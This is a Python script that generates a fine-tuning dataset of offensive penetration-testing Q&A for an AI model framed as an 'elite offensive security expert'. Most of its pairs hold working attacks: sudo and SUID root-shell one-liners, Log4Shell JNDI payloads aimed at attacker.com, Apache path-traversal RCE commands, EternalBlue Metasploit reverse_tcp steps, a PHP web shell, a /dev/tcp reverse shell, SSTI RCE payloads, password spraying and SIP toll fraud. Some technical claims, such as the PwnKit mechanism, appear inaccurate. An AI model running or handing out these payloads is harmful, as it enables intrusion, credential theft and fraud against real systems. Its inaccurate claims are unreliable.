#!/usr/bin/env python3
"""
CyberAgent Fine-Tuning Dataset Generator
Generates a high-quality pentest Q&A dataset from ChromaDB knowledge base.
Output: training/pentest_dataset.jsonl (ChatML format, Ollama-compatible)

Dataset structure covers all pentest phases with:
- CVE-based Q&A from NVD database
- Exploit technique Q&A from ExploitDB
- MITRE ATT&CK technique explanations
- GTFOBins usage examples
- HackTricks methodology
- OWASP Top 10 scenarios
- Anti-hallucination verification examples

Usage: python training/generate_dataset.py
"""
import json
import sys
import random
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

import chromadb

CHROMA_PATH = Path(__file__).parent.parent / "memory" / "chromadb"
OUTPUT_PATH = Path(__file__).parent / "pentest_dataset.jsonl"

SYSTEM_PROMPT = """You are CyberAgent-Pentest, an elite offensive security expert. 
You provide accurate, evidence-based penetration testing knowledge. 
You NEVER hallucinate CVE numbers, tool flags, or techniques. 
You always cite your sources (CVE ID, ExploitDB ID, MITRE technique ID, HackTricks section).
You respond in structured JSON when asked by agents, or clear professional English for human queries."""


def qa(question: str, answer: str) -> dict:
    """Format a Q&A pair in ChatML format."""
    return {
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": question},
            {"role": "assistant", "content": answer}
        ]
    }


def main():
    client = chromadb.PersistentClient(str(CHROMA_PATH))
    dataset = []

    print("[*] Generating pentest fine-tuning dataset from ChromaDB...")
    print(f"[*] Output: {OUTPUT_PATH}")

    # ── 1. MITRE ATT&CK Technique Q&A ────────────────────────────────────────
    print("\n[1/8] MITRE ATT&CK techniques...")
    try:
        mitre_col = client.get_collection("mitre_attack")
        results = mitre_col.get(limit=200, include=["documents", "metadatas"])
        for doc, meta in zip(results["documents"], results["metadatas"]):
            tid = meta.get("technique_id", "")
            tname = meta.get("name", "")
            tactic = meta.get("tactic", "")
            if not tid or not doc:
                continue
            dataset.append(qa(
                f"Explain MITRE ATT&CK technique {tid} ({tname}) and how it's used in penetration testing.",
                f"MITRE ATT&CK {tid} — {tname} (Tactic: {tactic})\n\n{doc[:800]}\n\nSource: MITRE ATT&CK Enterprise Framework"
            ))
            dataset.append(qa(
                f"What MITRE technique ID maps to the tactic '{tactic}' for '{tname}'?",
                f"The technique ID is {tid} — {tname}, classified under the {tactic} tactic in MITRE ATT&CK Enterprise.\n\n{doc[:400]}"
            ))
        print(f"  → {len([d for d in dataset if 'T1' in str(d)])} MITRE Q&A pairs")
    except Exception as e:
        print(f"  [WARN] MITRE collection error: {e}")

    # ── 2. GTFOBins Usage Q&A ─────────────────────────────────────────────────
    print("\n[2/8] GTFOBins privilege escalation...")
    gtfobins_qa = [
        qa("How do I escalate privileges using a SUID python3 binary?",
           "If python3 has SUID bit set, use: `python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`\nFirst verify: `find / -perm -4000 -name python3 2>/dev/null`\nSource: GTFOBins:python3 | MITRE: T1548.001"),
        qa("How do I abuse sudo vim for privilege escalation?",
           "If `sudo -l` shows NOPASSWD vim: Run `sudo vim` then inside vim type `:!bash` or `:set shell=/bin/bash` then `:shell`\nThis spawns a root shell because vim inherits sudo privileges.\nSource: GTFOBins:vim | MITRE: T1548.003"),
        qa("How do I exploit sudo find for privilege escalation?",
           "Command: `sudo find . -exec /bin/sh \\; -quit`\nThis spawns a shell with root privileges via sudo.\nVerify: `sudo -l | grep find`\nSource: GTFOBins:find | MITRE: T1548.003"),
        qa("How do I check for SUID binaries for privilege escalation on Linux?",
           "Command: `find / -perm -4000 -type f 2>/dev/null`\nAlso check SGID: `find / -perm -2000 -type f 2>/dev/null`\nThen cross-reference each SUID binary with GTFOBins at https://gtfobins.github.io\nSource: GTFOBins database | MITRE: T1548.001"),
        qa("How do I escalate privileges using sudo awk?",
           "Command: `sudo awk 'BEGIN {system(\"/bin/bash\")}'`\nRequires: `sudo -l` shows awk with NOPASSWD\nSource: GTFOBins:awk | MITRE: T1548.003"),
        qa("What is DirtyPipe and which kernel versions are vulnerable?",
           "DirtyPipe is CVE-2022-0847 (CVSS 7.8), a Linux kernel privilege escalation vulnerability.\nAffected: Linux kernel 5.8 through 5.16.11, 5.15.25, 5.10.102\nTechnique: Overwrite read-only files via pipe buffer manipulation\nExploit: Write to /etc/passwd to add root user or replace SUID binary\nSource: NVD:CVE-2022-0847 | MITRE: T1068"),
        qa("What is PwnKit (CVE-2021-4034) and how is it exploited?",
           "PwnKit is CVE-2021-4034 (CVSS 7.8), a local privilege escalation in polkit's pkexec.\nAffected: ALL Linux distributions with polkit (Ubuntu, Debian, Fedora, CentOS, etc.)\nExploit: Write malicious SUID pkexec → triggers heap overflow → root shell\nDetection: `dpkg -l policykit-1` or `rpm -qa polkit` to check version\nPatch: polkit >= 0.120 or 0.117-2 (Debian)\nSource: NVD:CVE-2021-4034 | EDB:50689 | MITRE: T1068"),
    ]
    dataset.extend(gtfobins_qa)
    print(f"  → {len(gtfobins_qa)} GTFOBins Q&A pairs")

    # ── 3. High-Impact CVE Q&A ────────────────────────────────────────────────
    print("\n[3/8] High-impact CVE knowledge...")
    cve_qa = [
        qa("Explain Log4Shell (CVE-2021-44228) and how to detect and exploit it.",
           """Log4Shell — CVE-2021-44228 (CVSS 10.0, Critical)
Affected: Apache Log4j 2.0-beta9 to 2.14.1
Attack: JNDI injection via log message: ${jndi:ldap://attacker.com/exploit}
Trigger: Any user-controlled string that gets logged (HTTP headers, User-Agent, URL params, form fields)

Detection:
  nuclei -t cves/2021/CVE-2021-44228.yaml -u http://target
  curl -H 'User-Agent: ${jndi:ldap://attacker.com/test}' http://target/

Exploitation:
  1. Set up LDAP/RMI server: python3 -m http.server 8888 (serve malicious class)
  2. Use ysoserial or marshalsec for LDAP redirector
  3. Send payload: ${jndi:ldap://ATTACKER:1389/exploit} in any logged field
  4. Target will download and execute your Java class

Patch: Upgrade to Log4j 2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6)
Source: NVD:CVE-2021-44228 | MITRE: T1190"""),
        qa("How do I exploit Apache Path Traversal CVE-2021-41773?",
           """CVE-2021-41773 — Apache HTTP Server 2.4.49 Path Traversal + RCE (CVSS 9.8)
Affected: ONLY Apache 2.4.49 (very specific version)
Requires: mod_cgi enabled for RCE; path traversal works without it

Path Traversal (read files):
  curl http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd

RCE via mod_cgi:
  curl -s --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/bin/sh" \\
    -d 'echo Content-Type: text/plain; echo; id'

Detection: nmap -sV --script http-shellshock -p 80,443 target
Version check: curl -I http://target (look for Server: Apache/2.4.49)
Nuclei: nuclei -t cves/2021/CVE-2021-41773.yaml -u http://target

Note: CVE-2021-42013 is the bypass for the incomplete patch of 41773 (affects 2.4.50)
Source: NVD:CVE-2021-41773 | EDB:50406 | MITRE: T1190"""),
        qa("Explain EternalBlue (CVE-2017-0144) and how to exploit it safely.",
           """EternalBlue — CVE-2017-0144 (CVSS 8.1, High)
Affected: Windows XP, Vista, 7, 8, Server 2003/2008/2012/2016 with SMBv1 enabled
Protocol: SMBv1 on port 445
NSA exploit leaked by ShadowBrokers, used in WannaCry and NotPetya ransomware

Detection:
  nmap --script smb-vuln-ms17-010 -p 445 target
  
Exploitation (Metasploit):
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS target
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST attacker_ip
  run

Manual (Python): python3 eternalblue.py target

Post-exploit: meterpreter → getsystem → hashdump → pass-the-hash

Mitigation: Disable SMBv1, apply MS17-010 patch, block 445 externally
Source: NVD:CVE-2017-0144 | EDB:42315 | MITRE: T1210"""),
        qa("What is Heartbleed (CVE-2014-0160) and what data can be extracted?",
           """Heartbleed — CVE-2014-0160 (CVSS 7.5, High)
Affected: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta
Vulnerability: Out-of-bounds read in TLS Heartbeat extension
Impact: Read up to 64KB of server memory per request — NO authentication required

Data that can leak: Private SSL keys, session tokens, passwords, plaintext data in memory

Detection:
  sslscan target:443 | grep -i heartbeat
  nmap --script ssl-heartbleed -p 443 target
  python heartbleed.py target

Exploitation: Repeated requests leak different memory chunks
  python heartbleed.py -p 443 target > leaked_memory.bin
  strings leaked_memory.bin | grep -i "pass\\|cookie\\|session"

Mitigation: Upgrade to OpenSSL 1.0.1g+, reissue all SSL certificates, invalidate sessions
Source: NVD:CVE-2014-0160 | EDB:32745 | MITRE: T1557"""),
        qa("What is Baron Samedit (CVE-2021-3156) and how is it exploited?",
           """Baron Samedit — CVE-2021-3156 (CVSS 7.8, High)
Affected: sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1
Vulnerability: Heap-based buffer overflow in sudoedit's argument parsing
Impact: Local privilege escalation to root WITHOUT sudo permission

Detection:
  sudoedit -s '\\' $(python3 -c 'print("A"*65536)')
  # If it crashes with malloc error → vulnerable
  # If it outputs "usage:" → patched

Exploitation:
  # PoC available in ExploitDB EDB-ID:49522
  python3 exploit_nss.py  # or exploit_defaults_macos.py

Verification: sudo --version (vulnerable: < 1.9.5p2)
Mitigation: Upgrade sudo to 1.9.5p2 or later
Source: NVD:CVE-2021-3156 | EDB:49522 | MITRE: T1068"""),
    ]
    dataset.extend(cve_qa)
    print(f"  → {len(cve_qa)} CVE Q&A pairs")

    # ── 4. Web Application Exploitation Q&A ──────────────────────────────────
    print("\n[4/8] Web application exploitation...")
    web_qa = [
        qa("How do I perform SQL injection with sqlmap on a GET parameter?",
           """SQLMap GET parameter injection:
Basic: sqlmap -u "http://target/page.php?id=1" --dbs --batch
Enumerate tables: sqlmap -u "http://target/page.php?id=1" -D database_name --tables
Dump table: sqlmap -u "http://target/page.php?id=1" -D database_name -T users --dump
Get OS shell: sqlmap -u "http://target/page.php?id=1" --os-shell (if INTO OUTFILE works)

POST injection: sqlmap -u "http://target/login" --data "user=admin&pass=test" -p user
Cookie injection: sqlmap -u "http://target/" --cookie "session=abc123" -p session
Level/Risk increase: sqlmap -u "..." --level=5 --risk=3 (more thorough, more noisy)

Source: OWASP A03:2021 | MITRE: T1190 | CWE-89"""),
        qa("How do I test for Server-Side Template Injection (SSTI)?",
           """SSTI Detection and Exploitation:
Detection payloads (try in ALL input fields):
  {{7*7}} → should return 49 if Jinja2/Twig vulnerable
  ${7*7} → FreeMarker/Velocity
  #{7*7} → Ruby ERB
  <% 7*7 %> → JSP/ERB

Jinja2 (Python/Flask) Full RCE:
  {{''.__class__.__mro__[1].__subclasses__()}}  # list classes
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  
Twig (PHP) RCE:
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

FreeMarker (Java) RCE:
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

Tool: tplmap.py automates SSTI detection and exploitation
Source: HackTricks:SSTI | PayloadsAllTheThings:SSTI | MITRE: T1059"""),
        qa("What is the methodology for testing File Upload vulnerabilities?",
           """File Upload Vulnerability Testing Methodology:
1. Identify upload functionality (profile pics, documents, attachments)
2. Test basic PHP shell upload: shell.php with <?php system($_GET['cmd']); ?>
3. If blocked by extension: try shell.PHP, shell.php5, shell.phtml, shell.phar
4. If blocked by Content-Type: intercept with Burp, change to image/jpeg
5. Double extension bypass: shell.php.jpg (depends on server parsing)
6. Null byte bypass: shell.php%00.jpg (older PHP versions)
7. Magic bytes bypass: add GIF89a; at start of PHP file
8. Exif injection: embed PHP in JPEG EXIF data
9. Find upload path: check source, response headers, gobuster /uploads/

Test execution: curl "http://target/uploads/shell.php?cmd=id"
Reverse shell: curl "http://target/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261"
Source: OWASP A04:2021 | HackTricks:FileUpload | CWE-434"""),
        qa("How do I test for SSRF (Server-Side Request Forgery)?",
           """SSRF Testing Methodology:
1. Identify URL parameters: ?url=, ?redirect=, ?fetch=, ?src=, ?webhook=, ?image=
2. Test basic SSRF: ?url=http://127.0.0.1/admin (access internal services)
3. Cloud metadata: ?url=http://169.254.169.254/latest/meta-data/ (AWS)
   GCP: ?url=http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
   Azure: ?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

Blind SSRF (out-of-band): use interactsh or Burp Collaborator
  ?url=http://UNIQUE_ID.oast.pro → check DNS/HTTP callbacks

Filter Bypass:
  http://127.1 (shorthand for 127.0.0.1)
  http://0x7f000001 (hex IP)
  http://[::1] (IPv6 loopback)
  http://localhost/ (hostname)

Internal port scan via SSRF: ?url=http://127.0.0.1:6379 (Redis), :5432 (PostgreSQL)
Source: OWASP A10:2021 | HackTricks:SSRF | MITRE: T1190"""),
    ]
    dataset.extend(web_qa)
    print(f"  → {len(web_qa)} web exploitation Q&A pairs")

    # ── 5. Network Pentest Q&A ────────────────────────────────────────────────
    print("\n[5/8] Network and service exploitation...")
    network_qa = [
        qa("What is the complete nmap command for a thorough service version scan?",
           """Complete Nmap Service Enumeration:
Full port + version + scripts:
  nmap -sS -sV -sC -O --version-intensity 9 -p- -T4 --open target -oA full_scan

Quick top ports (faster):
  nmap -sS -sV -sC -T4 --top-ports 1000 target

UDP scan (top 200):
  nmap -sU -T4 --top-ports 200 target

Vuln detection scripts:
  nmap --script vuln -p <ports_found> target

SMB specific:
  nmap --script smb-vuln-ms17-010,smb-enum-shares,smb-enum-users -p 445 target

Web specific:
  nmap --script http-shellshock,http-sql-injection,http-auth,http-methods -p 80,443 target

Source: nmap documentation | MITRE: T1046"""),
        qa("How do I enumerate SMB shares and check for null session vulnerabilities?",
           """SMB Enumeration Complete Guide:
Check connectivity: nmap -sV -p 445 target; smbclient -L //target -N

Null session (no credentials):
  smbclient //target/share -N
  enum4linux-ng -A target
  rpcclient -U "" target -N -c "enumdomusers"
  crackmapexec smb target --shares -u '' -p ''

Authenticated (with creds):
  crackmapexec smb target -u admin -p password --shares
  smbclient //target/C$ -U admin%password
  impacket-smbclient admin:password@target

Check for EternalBlue:
  nmap --script smb-vuln-ms17-010 -p 445 target

Password spray (slow, avoid lockout):
  crackmapexec smb target -u users.txt -p 'Password123!' --continue-on-success

Source: HackTricks:SMB | MITRE: T1135, T1021.002"""),
        qa("How do I perform VoIP penetration testing on a SIP service?",
           """VoIP SIP Penetration Testing:
1. Discovery: nmap -sU -p 5060 --script sip-methods target
2. Extension enum: svwar -e100-300 target (200=found, 403=auth required, 404=not found)
3. Credential brute force: svcrack -u200 -P rockyou.txt target
4. Call interception: sngrep (captures SIP/RTP on interface)

Attack Scenarios:
- Registration hijacking: Re-register victim extension to attacker's IP
- Toll fraud: Place international calls via stolen credentials
- Eavesdropping: Capture unencrypted RTP audio stream
- DoS: SIP INVITE flood: inviteflood target extension target_ip 5060 1000

Metasploit:
  use auxiliary/scanner/sip/options (discover SIP servers)
  use auxiliary/scanner/sip/enumerator (extension enum)

VLAN Hopping (access voice VLAN):
  802.1Q double-tagging if native VLAN mismatched
Source: PTES:VoIP | HackTricks:SIP | MITRE: T1046"""),
    ]
    dataset.extend(network_qa)
    print(f"  → {len(network_qa)} network pentest Q&A pairs")

    # ── 6. Linux PrivEsc Q&A ──────────────────────────────────────────────────
    print("\n[6/8] Linux privilege escalation...")
    try:
        privesc_col = client.get_collection("privesc_techniques")
        results = privesc_col.get(limit=60, include=["documents", "metadatas"])
        for doc, meta in zip(results["documents"][:20], results["metadatas"][:20]):
            name = meta.get("technique_name", "Linux PrivEsc technique")
            if doc and len(doc) > 100:
                dataset.append(qa(
                    f"Explain the Linux privilege escalation technique: {name}",
                    f"{doc[:800]}\nSource: InternalAllTheThings:PrivEsc | MITRE: T1548"
                ))
        print(f"  → {min(20, len(results['documents']))} PrivEsc Q&A pairs")
    except Exception as e:
        print(f"  [WARN] PrivEsc collection error: {e}")

    # ── 7. Anti-Hallucination Discipline Q&A ─────────────────────────────────
    print("\n[7/8] Anti-hallucination discipline...")
    ah_qa = [
        qa("A service banner shows 'Apache 2.4.49'. What CVEs are exploitable?",
           """Apache 2.4.49 Verified CVEs:
CVE-2021-41773 (CVSS 9.8) — Path Traversal + RCE
  - Path traversal: GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
  - RCE requires mod_cgi enabled
  - Confidence: HIGH (version confirmed, CVE documented in NVD)

CVE-2021-42013 (CVSS 9.8) — Incomplete fix for 41773 (affects 2.4.49 AND 2.4.50)
  - Additional bypass: %%32%65 encoding

Verification: Run nuclei -t cves/2021/CVE-2021-41773.yaml -u http://target
Source: NVD:CVE-2021-41773 | EDB:50406 | NVD:CVE-2021-42013

Note: I cite only VERIFIED CVEs. Do not report CVEs without version confirmation."""),
        qa("A service shows OpenSSL 1.0.2k. Is it vulnerable and to what?",
           """OpenSSL 1.0.2k Vulnerability Assessment:
Confirmed vulnerable:
- CVE-2017-3737 (CVSS 5.9) — Read buffer with invalid handshake (Medium)
- CVE-2017-3738 (CVSS 5.3) — AVX-512 carry propagation bug (Low)
- CVE-2016-0800 (DROWN) if SSLv2 enabled — check: sslscan target
- CVE-2014-0160 (Heartbleed) — OpenSSL 1.0.1 only, NOT 1.0.2k (different branch)

NOT vulnerable to Heartbleed (that's 1.0.1x branch).
Confidence: HIGH for CVE-2017-3737 if confirmed on OpenSSL 1.0.2k pre-patch

Verification: sslscan target:443; openssl s_client -connect target:443 | grep -i openssl
Source: NVD CVE database"""),
        qa("I don't know the exact sudo version. Can I assume CVE-2021-3156 applies?",
           """NO — never assume CVE applicability without version confirmation.

Correct process:
1. Get sudo version: sudo --version (if low-priv shell)
2. CVE-2021-3156 affects: sudo 1.8.2 through 1.8.31p2, 1.9.0 through 1.9.5p1
3. Check: if version < 1.9.5p2 → likely vulnerable
4. Quick test: sudoedit -s '\\' $(python3 -c 'print("A"*65536)')
   - Crashes with malloc → VULNERABLE
   - Shows usage error → PATCHED

Confidence without version: 0.3 (not reportable)
Confidence with version confirmed: 0.85
Confidence after crash test: 0.95

Always verify before reporting. CVE citations require evidence.
Source: NVD:CVE-2021-3156 | Anti-hallucination protocol"""),
        qa("Should I report a vulnerability with confidence 0.4?",
           """No — confidence below 0.5 means insufficient evidence for a vulnerability report.

Confidence thresholds:
- >= 0.8: Report as CONFIRMED vulnerability
- 0.6-0.79: Report as POTENTIAL vulnerability (requires verification)
- 0.5-0.59: List as INFORMATIONAL — further investigation needed
- < 0.5: Do NOT report — gather more information first

When confidence is 0.4:
1. Perform additional enumeration (nmap -sV --version-intensity 9)
2. Attempt manual verification of the CVE
3. Run targeted nuclei template for the specific CVE
4. Check two independent sources (NVD + ExploitDB)
5. Only report after confidence reaches >= 0.6

False positives in pentest reports destroy credibility.
Source: Anti-hallucination protocol | PTES:Reporting"""),
    ]
    dataset.extend(ah_qa)
    print(f"  → {len(ah_qa)} anti-hallucination Q&A pairs")

    # ── 8. Reporting and MITRE Mapping Q&A ───────────────────────────────────
    print("\n[8/8] Reporting and MITRE ATT&CK mapping...")
    report_qa = [
        qa("How do I calculate a CVSS v3.1 score for a network-exploitable RCE with no authentication?",
           """CVSS v3.1 Score Calculation for unauthenticated network RCE:
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)

Breakdown:
- AV:N (Attack Vector: Network) — exploitable remotely
- AC:L (Attack Complexity: Low) — no special conditions required
- PR:N (Privileges Required: None) — no authentication needed
- UI:N (User Interaction: None) — no victim interaction required
- S:U (Scope: Unchanged) — exploiting a single component
- C:H (Confidentiality: High) — complete disclosure
- I:H (Integrity: High) — complete data modification possible
- A:H (Availability: High) — complete denial of service possible

This is the maximum possible score for Unchanged scope (9.8).
If Scope Changed (S:C), max increases to 10.0.
Source: CVSS v3.1 Specification | NVD Calculator"""),
        qa("Map a successful exploitation chain to MITRE ATT&CK techniques.",
           """Example Attack Chain → MITRE ATT&CK Mapping:
Scenario: External to root on Linux web server

Step 1: Subdomain enumeration
  Technique: T1590.001 (Gather Victim Network Info: DNS)
  Tactic: TA0043 Reconnaissance

Step 2: Port scan and service fingerprinting
  Technique: T1046 (Network Service Discovery)
  Tactic: TA0007 Discovery

Step 3: SQL injection via login form
  Technique: T1190 (Exploit Public-Facing Application)
  Tactic: TA0001 Initial Access

Step 4: Web shell upload via SQLi INTO OUTFILE
  Technique: T1059.004 (Command and Scripting Interpreter: Unix Shell)
  Tactic: TA0002 Execution

Step 5: Reverse shell to attacker
  Technique: T1071.001 (Application Layer Protocol: Web Protocols)
  Tactic: TA0011 Command and Control

Step 6: SUID python3 privilege escalation
  Technique: T1548.001 (Abuse Elevation Control Mechanism: Setuid/Setgid)
  Tactic: TA0004 Privilege Escalation

Step 7: /etc/shadow hash dump
  Technique: T1003.008 (OS Credential Dumping: /etc/passwd and /etc/shadow)
  Tactic: TA0006 Credential Access"""),
    ]
    dataset.extend(report_qa)
    print(f"  → {len(report_qa)} reporting Q&A pairs")

    # ── Write JSONL output ────────────────────────────────────────────────────
    random.shuffle(dataset)

    with open(OUTPUT_PATH, "w") as f:
        for entry in dataset:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")

    print(f"\n{'=' * 60}")
    print(f"[✓] Dataset generated: {OUTPUT_PATH}")
    print(f"[✓] Total samples: {len(dataset)}")
    print(f"[✓] Format: ChatML (system + user + assistant messages)")
    print(f"\n[*] Dataset breakdown:")
    print(f"    MITRE ATT&CK Q&A:        varies (from ChromaDB)")
    print(f"    GTFOBins PrivEsc:         {len(gtfobins_qa)}")
    print(f"    High-Impact CVEs:         {len(cve_qa)}")
    print(f"    Web Exploitation:         {len(web_qa)}")
    print(f"    Network Pentest:          {len(network_qa)}")
    print(f"    Linux PrivEsc:            from ChromaDB")
    print(f"    Anti-Hallucination:       {len(ah_qa)}")
    print(f"    Reporting/MITRE:          {len(report_qa)}")
    print(f"\n[*] To use for fine-tuning:")
    print(f"    pip install unsloth  # For QLoRA fine-tuning")
    print(f"    python training/finetune.py  # Train on this dataset")
    print(f"    # Note: CPU training is very slow — recommend GPU for fine-tuning")


if __name__ == "__main__":
    main()
